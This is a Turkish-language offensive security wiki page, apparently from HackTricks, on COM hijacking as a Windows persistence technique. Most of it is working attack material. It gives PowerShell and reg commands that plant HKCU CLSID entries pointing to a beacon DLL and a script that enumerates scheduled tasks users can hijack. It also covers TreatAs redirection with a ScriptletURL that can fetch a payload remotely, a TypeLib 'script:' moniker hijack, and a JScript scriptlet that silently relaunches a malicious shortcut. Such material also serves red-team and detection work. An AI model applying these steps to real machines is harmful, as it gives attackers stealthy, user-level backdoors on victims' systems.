# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### Var olmayan COM bileşenleri arama

HKCU değerleri kullanıcılar tarafından değiştirilebildiği için **COM Hijacking** bir **persistence mechanism** olarak kullanılabilir. `procmon` kullanarak henüz var olmayan ve saldırgan tarafından oluşturulabilecek aranan COM kayıtlarını bulmak kolaydır. Klasik filtreler:

- **RegOpenKey** işlemleri.
- _Result_ değeri **NAME NOT FOUND** olduğunda.
- ve _Path_ **InprocServer32** ile bitiyorsa.

Av sırasında faydalı varyasyonlar:

- Ayrıca eksik **`LocalServer32`** anahtarlarını da kontrol edin. Bazı COM sınıfları ayrı süreçlerde çalışan sunuculardır ve bir DLL yerine saldırgan kontrollü bir EXE başlatırlar.
- `InprocServer32`'e ek olarak kayıt işlemlerinde **`TreatAs`** ve **`ScriptletURL`** için de arama yapın. Son tespit içerikleri ve malware writeups bunlara sıkça değiniyor çünkü normal COM kayıtlarından çok daha nadirdirler ve bu yüzden yüksek sinyal sağlarlar.
- Bir kaydı HKCU'ye kopyalarken orijinal `HKLM\Software\Classes\CLSID\{CLSID}\InprocServer32` içindeki geçerli **`ThreadingModel`**'i kopyalayın. Yanlış model genellikle etkinleştirmeyi bozar ve hijack'i gürültülü hale getirir.
- 64-bit sistemlerde hem 64-bit hem de 32-bit görünümlerini inceleyin (`procmon.exe` vs `procmon64.exe`, `HKLM\Software\Classes` ve `HKLM\Software\Classes\WOW6432Node`) çünkü 32-bit uygulamalar farklı bir COM kaydını çözümleyebilir.

Hangi mevcut olmayan COM'u taklit edeceğinize karar verdikten sonra, aşağıdaki komutları çalıştırın. _Her birkaç saniyede bir yüklenen bir COM'u taklit etmeye karar verirseniz dikkatli olun; bu aşırıya kaçabilir._
```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```
### Ele geçirilebilen Task Scheduler COM bileşenleri

Windows Tasks, COM nesnelerini çağırmak için Custom Triggers kullanır ve Task Scheduler üzerinden çalıştırıldıkları için ne zaman tetikleneceklerini tahmin etmek daha kolaydır.

<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
if ($Task.Actions.ClassId -ne $null)
{
if ($Task.Triggers.Enabled -eq $true)
{
$usersSid = "S-1-5-32-545"
$usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

if ($Task.Principal.GroupId -eq $usersGroup)
{
Write-Host "Task Name: " $Task.TaskName
Write-Host "Task Path: " $Task.TaskPath
Write-Host "CLSID: " $Task.Actions.ClassId
Write-Host
}
}
}
}

# Sample Output:
<strong># Task Name:  Example
</strong># Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [more like the previous one...]</code></pre>

Çıktıyı kontrol ederek, örneğin **her kullanıcı oturum açtığında** çalıştırılacak birini seçebilirsiniz.

Şimdi CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}**'yi **HKEY\CLASSES\ROOT\CLSID** içinde ve HKLM ile HKCU'da aradığınızda, genellikle bu değerin HKCU'da bulunmadığını görürsünüz.
```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```
Sonra, sadece HKCU girdisini oluşturabilirsiniz ve kullanıcı her oturum açtığında backdoor'ınız tetiklenecektir.

---

## COM TreatAs Hijacking + ScriptletURL

`TreatAs` bir CLSID'nin başka bir CLSID tarafından taklit edilmesine izin verir. Saldırgan bakış açısından bu, orijinal CLSID'yi dokunulmamış bırakabileceğiniz, `scrobj.dll`'i işaret eden kullanıcı-başına ikinci bir CLSID oluşturabileceğiniz ve ardından gerçek COM nesnesini `HKCU\Software\Classes\CLSID\{Victim}\TreatAs` ile kötü amaçlı olana yönlendirebileceğiniz anlamına gelir.

Bu şu durumlarda kullanışlıdır:

- hedef uygulama zaten oturum açarken veya uygulama başlarken sabit bir CLSID örneği oluşturuyorsa
- orijinal `InprocServer32`'yi değiştirmek yerine sadece registry tabanlı bir yönlendirme istiyorsanız
- yerel veya uzak bir `.sct` scriptlet'i `ScriptletURL` değeri aracılığıyla çalıştırmak istiyorsanız

Örnek iş akışı (adapted from public Atomic Red Team tradecraft and older COM registry abuse research):
```cmd
:: 1. Create a malicious per-user COM class backed by scrobj.dll
reg add "HKCU\Software\Classes\AtomicTest" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\AtomicTest\CLSID" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /ve /t REG_SZ /d "C:\Windows\System32\scrobj.dll" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /v "ThreadingModel" /t REG_SZ /d "Apartment" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL" /ve /t REG_SZ /d "file:///C:/ProgramData/atomic.sct" /f

:: 2. Redirect a high-frequency CLSID to the malicious class
reg add "HKCU\Software\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
```
Notlar:

- `scrobj.dll` `ScriptletURL` değerini okur ve referans verilen `.sct`'yi çalıştırır; bu yüzden payload'ı yerel bir dosya olarak tutabilir veya HTTP/HTTPS üzerinden uzaktan çekebilirsiniz.
- `TreatAs`, orijinal COM kaydı HKLM'de tam ve stabil olduğunda özellikle kullanışlıdır; çünkü tüm ağacı yansıtmak yerine yalnızca her kullanıcı için küçük bir yönlendirme gerekir.
- Doğal tetikleyiciyi beklemeden doğrulama yapmak için, hedef sınıf STA etkinleştirmesini destekliyorsa sahte ProgID/CLSID'yi elle `rundll32.exe -sta <ProgID-or-CLSID>` ile örnekleyebilirsiniz.

## COM TypeLib Hijacking (script: moniker persistence)

Type Libraries (TypeLib), COM arayüzlerini tanımlar ve `LoadTypeLib()` ile yüklenir. Bir COM sunucusu örneklenince, işletim sistemi ayrıca ilişkili TypeLib'i `HKCR\TypeLib\{LIBID}` altındaki kayıt anahtarlarına bakarak yükleyebilir. TypeLib yolu bir **moniker** ile değiştirilirse, örn. `script:C:\...\evil.sct`, TypeLib çözümlendiğinde Windows scriptlet'i çalıştırır — bu da yaygın bileşenlere dokunulduğunda tetiklenen gizli bir persistence sağlar.

Bu durum Microsoft Web Browser control'a karşı gözlemlenmiştir (sıklıkla Internet Explorer, WebBrowser gömülü uygulamalar ve hatta `explorer.exe` tarafından yüklenir).

### Adımlar (PowerShell)

1) Yüksek sıklıkta kullanılan bir CLSID tarafından kullanılan TypeLib (LIBID) tespit edin. Örnek olarak zararlı yazılım zincirlerince sıkça kötüye kullanılan CLSID: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft Web Browser).
```powershell
$clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
$libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
$ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
"CLSID=$clsid  LIBID=$libid  VER=$ver"
```
2) Kullanıcı başına TypeLib yolunu yerel bir scriptlet'e `script:` moniker'ını kullanarak yönlendirin (yönetici hakları gerekmez):
```powershell
$dest = 'C:\\ProgramData\\Udate_Srv.sct'
New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
```
3) Ana payload'ınızı yeniden başlatan minimal bir JScript `.sct` bırakın (ör. initial chain tarafından kullanılan bir `.lnk`):
```xml
<?xml version="1.0"?>
<scriptlet>
<registration progid="UpdateSrv" classid="{F0001111-0000-0000-0000-0000F00D0001}" description="UpdateSrv"/>
<script language="JScript">
<![CDATA[
try {
var sh = new ActiveXObject('WScript.Shell');
// Re-launch the malicious LNK for persistence
var cmd = 'cmd.exe /K set X=1&"C:\\ProgramData\\NDA\\NDA.lnk"';
sh.Run(cmd, 0, false);
} catch(e) {}
]]>
</script>
</scriptlet>
```
4) Tetikleme – IE'yi açmak, WebBrowser control'ü barındıran bir uygulama veya hatta rutin Explorer etkinliği TypeLib'i yükleyip scriptlet'i çalıştırarak oturum açma/yeniden başlatma sırasında zincirinizi yeniden etkinleştirir.

Temizlik
```powershell
# Remove the per-user TypeLib hijack
Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$null
# Delete the dropped scriptlet
Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
```
Notlar
- Aynı mantığı diğer yüksek frekanslı COM bileşenlerine de uygulayabilirsiniz; her zaman önce gerçek `LIBID`'yi `HKCR\CLSID\{CLSID}\TypeLib` anahtarından çözümleyin.
- 64-bit sistemlerde 64-bit tüketiciler için `win64` alt anahtarını da doldurabilirsiniz.

## Kaynaklar

- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Revisiting COM Hijacking (SpecterOps)](https://specterops.io/blog/2025/05/28/revisiting-com-hijacking/)
- [CLSID Key (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/com/clsid-key-hklm)

{{#include ../../banners/hacktricks-training.md}}
